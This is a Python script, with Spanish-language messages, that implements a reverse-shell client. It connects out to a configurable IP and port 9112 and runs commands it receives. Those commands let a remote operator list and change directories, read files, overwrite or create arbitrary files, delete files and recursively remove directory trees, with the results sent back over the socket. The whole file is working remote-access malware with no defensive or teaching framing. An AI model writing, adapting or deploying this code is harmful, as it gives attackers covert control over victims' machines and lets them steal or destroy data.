# encoding: utf-8
import socket
import os 
import sys
import shutil

ip = "Your IP"
port = 9112

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))

while True:
    response = client.recv(4096)

    if response.decode() == "pwd":
        ruta = os.getcwd()
        path = ruta.encode()
        client.send(path)

    elif response.decode() == "sys":
        sistem = sys.platform
        sistema = sistem.encode()
        client.send(sistema)

    elif response.decode() == "ls":
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

    elif response.decode() == "cd ..":
        os.chdir("../")
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
    
    elif response.decode()[:2] == "cd":
        os.chdir(response.decode()[3:])
        result = os.getcwd()
        path = result.encode()
        client.send(path)

    elif response.decode()[:5] == "mkdir":
        os.mkdir(response.decode()[6:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

    elif response.decode()[:2] == "rm":
        os.remove(response.decode()[3:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
    
    elif response.decode()[:2] == "rd":
        shutil.rmtree(response.decode()[3:])
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)
        
    elif response.decode()[:5] == "write":
        f = open (response.decode()[6:],'w')
        response = client.recv(4096)
        f.write(response.decode())
        f.close()
        client.send(bytes("Archivo reescrito", "utf-8"))

    elif response.decode()[:5] == "touch":
        f = open (response.decode()[6:],'w')
        response = client.recv(4096)
        f.write(response.decode())
        f.close()
        client.send(bytes("Archivo creado y escrito\n", "utf-8"))
        ls = os.listdir(os.getcwd())
        lis = str(ls)
        listar = bytes(lis, "utf-8")
        client.send(listar)

    elif response.decode()[:4] == "read":
        f = open(response.decode()[5:])
        file = f.read()
        files = bytes(file, "utf-8")
        client.send(files)

    elif response.decode() == "exit":
        sys.exit(1)
    
    elif response.decode() == "empty":
        client.send(bytes('No has elegido ningún comando', "utf-8"))
    
    else:
        client.send(bytes('El comando está mal escrito', "utf-8"))
